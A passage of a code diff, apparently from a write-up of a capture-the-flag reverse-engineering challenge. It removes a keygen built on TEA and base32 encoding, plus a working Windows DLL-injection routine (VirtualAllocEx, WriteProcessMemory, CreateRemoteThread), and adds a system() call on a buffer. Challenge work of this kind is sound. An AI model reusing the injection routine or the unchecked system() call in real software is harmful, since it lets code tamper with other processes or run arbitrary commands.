-                        sprintf_s(buf, "sp = %d, init_stack = %x\n", 
-                            new_cpu.sp_ - 2,
-                            init_stack_byte);
-                        WriteConsoleA(m_hConsole, buf, strlen(buf), NULL, NULL);
-                        if(Search(cmd, ip + 1, &amp;new_cpu, dst_stack, operation, final_ip, init_stack))
-                        {
-                            init_stack[new_cpu.sp_ - 2] = init_stack_byte;
-                            operation[ip] = i;
-                            return TRUE;
-                        }
-                    }
-                }
-                else
-                {
-                    // No value is popped onto the stack
-                    /*if(Search(cmd, ip + 1, &amp;new_cpu, dst_stack, operation, final_ip))
-                    {
-                        operation[ip] = i;
-                        return TRUE;
-                    }*/
-                    // return FALSE;
-                }
-            }
+            puts( "voila!" );
+            system( buf );
         }
     }
 
-
-    return FALSE;
-}
-
-VOID Process()
-{
-    struct CPU_ cpu_;
-    memset(&amp;cpu_, 0, sizeof(cpu_));
-
-    AllocConsole();
-    m_hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
-
-    Initialize();
-    WriteConsoleA(m_hConsole, "Initialization finished.\n", strlen("Initialization finished.\n"), NULL, NULL);
-
-    prepare_teamname(&amp;cpu_, "R3V3rZ3 I5 C00L");
-    //prepare_teamname(&amp;cpu_, "blue-lotus");
-
-    char buf[2048];
-    sprintf_s(buf, "CPU k_init = %08x %08x %08x %08x\n", 
-        cpu_.k_init[0], 
-        cpu_.k_init[1],
-        cpu_.k_init[2],
-        cpu_.k_init[3]);
-    WriteConsoleA(m_hConsole, buf, strlen(buf), NULL, NULL);
-
-    char src[] = "CTF_COOL";
-    byte dst[8];
-    tean(1, (byte*)src, dst, cpu_.k_init, 8);
-    sprintf_s(buf, "Standard stack = %08x %08x\n", 
-        *(unsigned int*)dst,
-        *(unsigned int*)(dst + 4));
-    WriteConsoleA(m_hConsole, buf, strlen(buf), NULL, NULL);
-
-    byte k_flipped[16];
-    byte data_flipped[16] = {0};
-    for(int i = 0; i &lt; 8; ++i)
-    {
-        k_flipped[i * 2] = ((byte*)cpu_.k_init)[i * 2 + 1];
-        k_flipped[i * 2 + 1] = ((byte*)cpu_.k_init)[i * 2];
-    }
-
-    struct CPU_ new_cpu;
-    int uFinalIp;
-    byte init_stack[8];
-    init_stack[7] = dst[7];
-    memset(&amp;new_cpu, 0, sizeof(struct CPU_));
-    new_cpu.sp_ = 1;
-    BOOL result = Search(k_flipped, 0, &amp;new_cpu, dst, data_flipped, &amp;uFinalIp, init_stack);
-
-    sprintf_s(buf, "Result = %x, final_ip = %x\n",
-        result,
-        uFinalIp);
-    WriteConsoleA(m_hConsole, buf, strlen(buf), NULL, NULL);
-
-    byte data[25] = {0};
-    // First 16 bytes
-    for(int i = 0; i &lt; 8; ++i)
-    {
-        data[i * 2] = data_flipped[i * 2 + 1];
-        data[i * 2 + 1] = data_flipped[i * 2];
-    }
-    data[16] = (byte)uFinalIp;
-    // 17 ~ 25 bytes
-    for(int i = 17; i &lt; 25; ++i)
-    {
-        data[i] = init_stack[i - 17];
-    }
-
-    // Convert it to keys
-    char szAllowedChars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
-    char final_key[41] = {0};
-    int pos = 0;
-    int key_pos = 0;
-    int bit_left = 0;
-    int s = 0;
-    while(pos &lt; 25)
-    {
-        s = (s &lt;&lt; 8) | data[pos];
-        ++pos;
-        bit_left += 8;
-        while(bit_left &gt;= 5)
-        {
-            int x = (s &gt;&gt; (bit_left - 5)) &amp; 0x1f;
-            final_key[key_pos ++] = szAllowedChars[x];
-            bit_left -= 5;
-        }
-        s = s &amp; 0x1f;
-    }
-    WriteConsoleA(m_hConsole, final_key, strlen(final_key), NULL, NULL);
-}
-
-BOOL WINAPI Inject(DWORD dwProcessID)
-{
-    TCHAR strModulePath[2000] = {0};
-    GetModuleFileName(m_hModule, strModulePath, 2000);
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, dwProcessID);
-    FARPROC farLoadLibrary = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryW");
-    LPVOID lpDllAddr = VirtualAllocEx(hProcess, NULL, wcslen(strModulePath) * sizeof(TCHAR), MEM_COMMIT, PAGE_READWRITE); 
-    if(lpDllAddr != NULL)
-    {
-        if(WriteProcessMemory(hProcess, lpDllAddr, strModulePath, wcslen(strModulePath) * sizeof(TCHAR), NULL))
-        {
-            HANDLE hT = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)farLoadLibrary, lpDllAddr, 0, NULL);   
-            CloseHandle(hT);
-            CloseHandle(hProcess);
-            return TRUE;
-        }
-    }
-    return FALSE;
+    return 0;
 }
 </code></pre>
 ]]></content>
